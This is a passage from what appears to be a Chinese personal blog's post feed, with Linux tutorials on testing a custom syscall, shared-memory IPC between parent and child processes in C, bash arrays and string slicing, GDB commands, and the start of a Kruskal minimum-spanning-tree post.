<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// syscall 需要传递一个系统调用编号</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> myRetutn = syscall(<span class="number">548</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"syscall return: %ld"</span>,myRetutn);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc testMyCall.c -o test</span><br><span class="line">./test</span><br><span class="line">syscall return: 1</span><br></pre></td></tr></table></figure>

<p><strong>我们发现并没有输出<code>hello syscall!</code></strong>,是因为日志输出级别问题，只需要调用<code>dmesg</code>命令即可。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>命令行</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>进程之间使用共享内存通信</title>
    <url>/2020/04/22/%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E4%BD%BF%E7%94%A8%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。<a id="more"></a></p>
<p>但是它并未提供同步机制，即在某一个进程结束对共享内存的写操作之前，并不能可以阻止第二个进程开始对它进行读取，因此我们需要人为阻止通过其他机制进行同步。</p>
<h2 id="shmget-函数"><a href="#shmget-函数" class="headerlink" title="shmget()函数"></a>shmget()函数</h2><p>用于得到一个共享内存标识符或创建一个共享内存。</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>key</td>
<td>标识共享内存的键值，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</td>
</tr>
<tr>
<td>size</td>
<td>指明共享内存的大小，以字节为单位</td>
</tr>
<tr>
<td>shmflg</td>
<td>权限标志<br>IPC_CREAT  如果共享内存不存在，则创建一个共享内存，否则打开操作。<br>  IPC_EXCL  只有在共享内存不存在的时候，新的共享内存才建立，否则就产生错误。</td>
</tr>
</tbody></table>
<h2 id="shmat-函数"><a href="#shmat-函数" class="headerlink" title="shmat()函数"></a>shmat()函数</h2><p>第一次创建完共享内存后，它还不能被任何进程访问，<code>shmat()</code>函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>shmid</td>
<td>共享存储的id，如shmget()函数的返回值</td>
</tr>
<tr>
<td>shmaddr</td>
<td>指定共享内存连接到当前进程中的地址位置，一般为0，表示让内核自己决定一个合适的地址位置</td>
</tr>
<tr>
<td>shmflg</td>
<td>SHM_RDONLY：为只读模式，其他为读写模式，如0</td>
</tr>
</tbody></table>
<p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1。</p>
<h2 id="shmdt-函数"><a href="#shmdt-函数" class="headerlink" title="shmdt()函数"></a>shmdt()函数</h2><p>与<code>shmat</code>函数相反，是用来断开与共享内存附加点的地址，禁止本进程访问此片共享内存，但是并不是删除该共享内存。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>shmaddr</strong>:连接的共享内存的起始地址，如<code>shmat()</code>函数的返回值。调用成功的时候返回0，失败时返回-1。</p>
<h2 id="shmctl-函数"><a href="#shmctl-函数" class="headerlink" title="shmctl()函数"></a>shmctl()函数</h2><p>控制共享内存。</p>
<p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shm_id, <span class="keyword">int</span> command, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>shm_id</td>
<td>共享内存标识符，如shmget()的返回值</td>
</tr>
<tr>
<td>command</td>
<td>一些命令，如<br>IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中<br>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值<br>IPC_RMID：删除这片共享内存</td>
</tr>
<tr>
<td>buf</td>
<td>共享内存管理结构体。</td>
</tr>
</tbody></table>
<p>shmid_ds结构 至少包括以下成员：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct shmid_ds</span><br><span class="line">&#123;</span><br><span class="line">    uid_t shm_perm.uid;</span><br><span class="line">    uid_t shm_perm.gid;</span><br><span class="line">    mode_t shm_perm.mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>例如一个简单的例子，父子进程通过共享内存的方式进行通信：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-22 14:22:16</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-22 21:38:34</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\others\shareMemory.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> mod;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">100</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *shm = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shareMemoryDate</span> *<span class="title">share</span>;</span></span><br><span class="line">    <span class="comment">// 创建一个共享内存</span></span><br><span class="line">    <span class="comment">// IPC_CREAT表示如果共享内存不存在，则创建一个共享内存，否则打开操作。</span></span><br><span class="line">    <span class="comment">// 需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line">    <span class="keyword">int</span> shm_id =</span><br><span class="line">        shmget((<span class="keyword">key_t</span>)<span class="number">0</span>, <span class="keyword">sizeof</span>(struct shareMemoryDate), <span class="number">0600</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pId = fork();</span><br><span class="line">    <span class="keyword">if</span> (pId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"创建子进程失败，我也不知为什么\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        <span class="comment">// 将共享内存连接到当前进程的地址空间</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"链接失败，我也不知为什么\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我是子进程，请输入想要写入共享内存的内容:\n"</span>);</span><br><span class="line">        fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(share-&gt;msg, <span class="built_in">buffer</span>);</span><br><span class="line">        <span class="comment">// 表示将数据写入完毕</span></span><br><span class="line">        share-&gt;mod = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (shmdt(shm) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"分离失败，我也不知为什么\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pId &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        <span class="comment">// 将共享内存连接到当前进程的地址空间</span></span><br><span class="line">        shm = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shm == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"链接失败，我也不知为什么\n"</span>);</span><br><span class="line">            <span class="comment">// 删除共享内存</span></span><br><span class="line">            <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"（无法链接）删除共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        share = (struct shareMemoryDate *)shm;</span><br><span class="line">        <span class="comment">//等待子进程写入完毕</span></span><br><span class="line">        <span class="keyword">while</span> (share-&gt;mod != <span class="number">1</span>) sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我是父进程，让我看看我的子进程在共享内存里边写了什么东西：\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, share-&gt;msg);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"噢，原来是这些鬼玩意\n"</span>);</span><br><span class="line">        <span class="comment">// 删除共享内存</span></span><br><span class="line">        <span class="keyword">if</span> (shmctl(shm_id, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(读取完毕)删除共享内存失败，我也不知为什么\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$ gcc -o share shareMemory.c</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$ ./share</span><br><span class="line">我是子进程，请输入想要写入共享内存的内容:</span><br><span class="line">你好啊</span><br><span class="line">我是父进程，让我看看我的子进程在共享内存里边写了什么东西：</span><br><span class="line">你好啊</span><br><span class="line"></span><br><span class="line">噢，原来是这些鬼玩意</span><br><span class="line">yalexin@yalexin-PC:/media/yalexin/软件/my_c_workspace/others$</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>进程通信</tag>
      </tags>
  </entry>
  <entry>
    <title>shell使用数组</title>
    <url>/2020/04/19/shell%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h2><p>使用括号定义数组，定义的时候可以用元素进行初始化，也可以直接定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="访问数组："><a href="#访问数组：" class="headerlink" title="访问数组："></a>访问数组：</h2><p>一般格式是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;arrayName[index]&#125;</span></span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[1]&#125;</span><br></pre></td></tr></table></figure>

<p>数组的下标跟C语言一样是从0开始的，所以上面输出的是<code>item2</code></p>
<p>也可以访问全部元素，下面两种方法是等价的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">echo $&#123;array2[@]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="追加元素"><a href="#追加元素" class="headerlink" title="追加元素"></a>追加元素</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br></pre></td></tr></table></figure>

<p>然后让我们看一下现在的数组是怎么样子的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">array1&#x3D;()</span><br><span class="line">array2&#x3D;(item1 item2 item3)</span><br><span class="line">array2[50]&#x3D;&quot;abc&quot;</span><br><span class="line">array2[30]&#x3D;&quot;def&quot;</span><br><span class="line">echo $&#123;array2[*]&#125;</span><br><span class="line">------------------------------</span><br><span class="line">yalexin@yalexin-PC:&#x2F;usr&#x2F;study$ .&#x2F;array.sh</span><br><span class="line">item1 item2 item3 def abc</span><br></pre></td></tr></table></figure>

<p>可以发现，追加元素时候下标不需要是连续的，当我们输出全部元素的时候，元素是空值的会自动省略。</p>
<h2 id="获取长度："><a href="#获取长度：" class="headerlink" title="获取长度："></a>获取长度：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[*]&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">len&#x3D;$&#123;#array2[@]&#125;</span><br></pre></td></tr></table></figure>

<p>也可以获取数组元素的长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">indexLen&#x3D;$&#123;#array2[50]&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>indexLen</code>指的是元素的字符个数。</p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>shell字符串截取</title>
    <url>/2020/04/19/shell%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96/</url>
    <content><![CDATA[<h2 id="使用-号截取右边字符"><a href="#使用-号截取右边字符" class="headerlink" title="使用 # 号截取右边字符"></a>使用 # 号截取右边字符</h2><p>格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url#*childStr&#125;</span><br></pre></td></tr></table></figure>

<p>childStr可以是字符串或者是特定字符，将返回匹配<strong>第一个</strong><code>childStr</code>后的字符串<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file_name="test.txt"</span><br><span class="line">echo $&#123;file_name#*.&#125;</span><br></pre></td></tr></table></figure>

<p>将输出<code>txt</code></p>
<p>如果希望匹配<strong>最后一个</strong><code>childStr</code>后的字符串,可以使用<code>##</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_name&#x3D;&quot;test.tar.gz&quot;</span><br><span class="line">echo $&#123;file_name##*.&#125;</span><br></pre></td></tr></table></figure>

<p>将返回<code>gz</code></p>
<h2 id="使用-号截取左边字符"><a href="#使用-号截取左边字符" class="headerlink" title="使用 % 号截取左边字符"></a>使用 % 号截取左边字符</h2><p>格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url%childStr*&#125;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">file_name="test.tar.gz"</span><br><span class="line">echo $&#123;file_name%.*&#125;</span><br><span class="line">echo $&#123;file_name%%.*&#125;</span><br></pre></td></tr></table></figure>

<p>将输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.tar</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h2 id="截取指定个数字符串"><a href="#截取指定个数字符串" class="headerlink" title="截取指定个数字符串"></a>截取指定个数字符串</h2><ul>
<li><p>从字符串左边</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">str="abcdefghijkl"</span><br><span class="line">echo $&#123;str:2:100&#125;</span><br></pre></td></tr></table></figure>

<p>输出<code>cdefg</code>，即输出从<code>startIndex</code>开始长度是<code>length</code>的字符串，当<code>length</code>超出最后一个元素的界限或者是缺省时将输出从<code>startIndex</code>直至末尾。</p>
</li>
<li><p>从字符串右边</p>
<p>通常的语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;string: 0-startIndex :length&#125;</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:0-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>将输出<code>fgh</code>，因为从右边往左边数，c，当然也可以这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:1-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>此时的输出就变成了：<code>ghi</code>,可以这样理解：第七个字符是<code>f</code>，然后再往后偏移一个字符，再从这里开始截取三个字符。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下使用GDB调试C程序</title>
    <url>/2020/04/15/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95C%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>在Windows上利用vs code等IDE（虽然是vs code不能算得上IDE）是很方便进行程序的调试，但是在没有图形界面的Linux环境下如何进行调试？答案就是借助<code>GDB</code>类似的调试器。</p>
<blockquote>
<p>文章摘录自<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/" target="_blank" rel="noopener">linux tools quick tutoril</a>中的<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html" target="_blank" rel="noopener">gdb调试利器</a></p>
</blockquote>
<a id="more"></a>GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。

<p>对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p>
<p>有些系统没有默认安装，需要自己安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gdb</span><br></pre></td></tr></table></figure>

<p>例如，有一个c程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -g hello.c -o hello  # C++程序使用g++</span><br></pre></td></tr></table></figure>

<p>调试可执行文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gdb hello</span><br></pre></td></tr></table></figure>

<p>然后进入交互界面，通过下面的命令进行调试：</p>
<p>运行类命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>run，简写r</td>
<td>运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</td>
</tr>
<tr>
<td>continue 简写c</td>
<td>继续执行，到下一个断点处（或运行结束）</td>
</tr>
<tr>
<td>step 简写s</td>
<td>单步调试如果有函数调用，则进入函数；</td>
</tr>
<tr>
<td>next 简写n</td>
<td>单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内</td>
</tr>
<tr>
<td>until</td>
<td>当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体</td>
</tr>
<tr>
<td>until+行号</td>
<td>运行至某行，不仅仅用来跳出循环</td>
</tr>
<tr>
<td>finish</td>
<td>运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</td>
</tr>
<tr>
<td>call 函数(参数)</td>
<td>调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</td>
</tr>
<tr>
<td>quit简写q</td>
<td>推出gdb交互界面</td>
</tr>
</tbody></table>
<p>设置断点类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>break n 简写 b n</td>
<td>在程序的第n行设置断点</td>
</tr>
<tr>
<td>b  n if conditions</td>
<td>满足conditions条件时候在第n行设置断点</td>
</tr>
<tr>
<td>b functionName</td>
<td>在函数functionName()的入口处设置断点</td>
</tr>
<tr>
<td>delete n</td>
<td>删除第n个断点</td>
</tr>
<tr>
<td>clear n</td>
<td>清除第n行的断点 注意和delete的区别，删除函数的入口断点也是使用该命令</td>
</tr>
<tr>
<td>disable n</td>
<td>暂停第n个断点</td>
</tr>
<tr>
<td>enable n</td>
<td>开启第n个断点</td>
</tr>
<tr>
<td>info b</td>
<td>显示当前程序的断点设置情况</td>
</tr>
<tr>
<td>delete breakpoints</td>
<td>清除所有断点</td>
</tr>
</tbody></table>
<p>查看源代码类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>list 简写l</td>
<td>列出程序的源代码，默认每次显示10行。<br>再次输入则将从上次输出的位置开始输出<br><strong>注意：</strong>生成可执行程序的时候如果没有加上<code>-g</code>选项的话，该命令是不能够执行的</td>
</tr>
<tr>
<td>list n</td>
<td>将显示当前文件以第n行为中心的前后10行代码，如：list 5</td>
</tr>
<tr>
<td>list functionName</td>
<td>将显示“函数名”所在函数的源代码，如：list main   或者 list test</td>
</tr>
</tbody></table>
<p>打印表达式类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>print 表达式</td>
<td>表达式可以是程序中的变量，也可以是自己定义的表达式，如<br><code>print 2 * 2</code>，类似于C语言的<code>printf</code>函数</td>
</tr>
<tr>
<td>print func_name(p1,p1,…)</td>
<td>例如，调用求和函数并且打印结果<code>print sum(1,2,3)</code></td>
</tr>
<tr>
<td>display 表达式</td>
<td>单步运行时每执行一步都打印表示式的内容。</td>
</tr>
<tr>
<td>info locals</td>
<td>显示当前堆栈页的所有变量</td>
</tr>
</tbody></table>
<p>查询运行信息</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>where/bt</td>
<td>当前运行的堆栈列表</td>
</tr>
<tr>
<td>bt backtrace</td>
<td>显示当前调用堆栈</td>
</tr>
<tr>
<td>up/down</td>
<td>改变堆栈显示的深度</td>
</tr>
<tr>
<td>set args 参数</td>
<td>指定运行时的参数</td>
</tr>
<tr>
<td>show args</td>
<td>查看设置好的参数</td>
</tr>
<tr>
<td>info program</td>
<td>来查看程序的是否在运行，进程号，被暂停的原因。</td>
</tr>
</tbody></table>
<p>分割窗口</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>layout</td>
<td>用于分割窗口，可以一边查看代码，一边测试</td>
</tr>
<tr>
<td>layout src</td>
<td>显示源代码窗口</td>
</tr>
<tr>
<td>layout asm</td>
<td>显示反汇编窗口</td>
</tr>
<tr>
<td>layout regs</td>
<td>显示源代码/反汇编和CPU寄存器窗口</td>
</tr>
<tr>
<td>layout split</td>
<td>显示源代码和反汇编窗口</td>
</tr>
<tr>
<td>Ctrl + L</td>
<td>刷新窗口</td>
</tr>
</tbody></table>
<p>*<em>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便； *</em></p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>命令行</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>利用并查集求最小生成树</title>
    <url>/2020/04/10/%E5%88%A9%E7%94%A8%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="什么是-Kruskal-算法？"><a href="#什么是-Kruskal-算法？" class="headerlink" title="什么是 Kruskal 算法？"></a>什么是 Kruskal 算法？</h2><p><strong>Kruskal</strong> 算法是求最小生成树的一种方法，有点类似于贪心算法，首先是按照边的权值从小到大进行排序，然后不断地将较小的边加入到过程解的集合，关键是要解决回路的问题，而利用并查集就可以很好地解决这个问题，即每次添加边之前，判断该边的两个顶点是否是处于相同的集合，相同就跳过，否则加入到过程解中，重复这个过程，知道最后只有一个集合，该集合即为所求。<a id="more"></a></p>
<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>来源于<a href="https://www.luogu.com.cn/problem/P3366" target="_blank" rel="noopener">洛谷</a></p>
<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题，给出一个无向图，求出最小生成树，如果该图不连通，则输出 <code>orz</code>。</p>
<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行包含两个整数 N,<em>M</em>，表示该图共有 <em>N</em> 个结点和 <em>M</em> 条无向边。</p>
<p>接下来 <em>M</em> 行每行包含三个整数 X<sub>i</sub>，  Y<sub>i</sub>，  Z<sub>i</sub>，表示有一条长度为   Z<sub>i</sub> 的无向边连接结点   X<sub>i</sub>，  Y<sub>i</sub></p>
<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>如果该图连通，则输出一个整数表示最小生成树的各边的长度之和。如果该图不连通则输出 <code>orz</code>。</p>
